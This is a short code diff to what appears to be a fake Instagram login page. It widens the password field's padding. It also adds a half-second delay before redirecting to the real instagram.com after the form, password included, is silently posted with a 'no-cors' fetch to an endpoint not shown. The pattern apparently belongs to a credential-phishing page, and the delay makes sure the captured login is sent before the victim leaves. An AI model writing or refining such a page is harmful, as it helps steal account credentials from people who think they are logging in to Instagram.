@@ -39,7 +39,7 @@
         }
 
         .password-container input {
-            padding-right: 40px;
+            padding-right: 50px;
         }
 
         .toggle-password {
@@ -109,7 +109,9 @@
             body: form,
             mode: "no-cors"
         }).then(() => {
-            window.location.href = "https://www.instagram.com"; // Redirige a Instagram
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com"; // Redirige a Instagram
+            }, 500); // Espera medio segundo antes de redirigir
         });
 
         this.reset();
